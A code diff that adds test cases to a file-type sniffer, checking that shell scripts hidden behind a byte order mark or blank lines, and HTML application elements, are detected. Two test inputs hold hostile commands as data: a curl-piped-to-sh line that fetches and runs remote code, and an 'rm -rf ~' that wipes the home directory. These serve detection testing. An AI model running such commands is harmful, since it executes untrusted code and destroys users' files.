@@ -81,3 +81,28 @@ describe("sniff: where a tag ends (M11-R131)", () => {
     expect(typeOf(input)).toBe("text/html");
   });
 });
+
+describe("sniff: scripts and HTML applications a signature at byte 0 missed (M11-R136)", () => {
+  it.for([
+    // execve(2) runs neither, but a shell that gets ENOEXEC runs the file as a shell script (POSIX.1-2024 §2.9.1.4).
+    { name: "a script behind a UTF-8 byte order mark", input: "\xef\xbb\xbf#!/bin/sh\ncurl example.com | sh\n" },
+    { name: "a script behind a blank line", input: "\n#!/bin/sh\nrm -rf ~\n" },
+    { name: "a script behind spaces and a Windows line break", input: " \r\n#! /usr/bin/env python3\n" },
+  ])("detects $name", ({ input }) => {
+    expect(typeOf(input)).toBe("text/x-shellscript");
+  });
+
+  it.for([
+    { name: "an HTML application's own element at the start", input: '<HTA:APPLICATION ID="app" SCROLL="no">' },
+    { name: "an HTML application's own element after a comment", input: "<!--x--><hta:application>" },
+  ])("detects a web page in $name", ({ input }) => {
+    expect(typeOf(input)).toBe("text/html");
+  });
+
+  it.for([
+    { name: "prose that opens with #! behind a blank line", input: "\n#!important: water the plants\n" },
+    { name: "a #! line further down", input: "notes\n#!/bin/sh\n" },
+  ])("detects nothing in $name", ({ input }) => {
+    expect(typeOf(input)).toBeNull();
+  });
+});
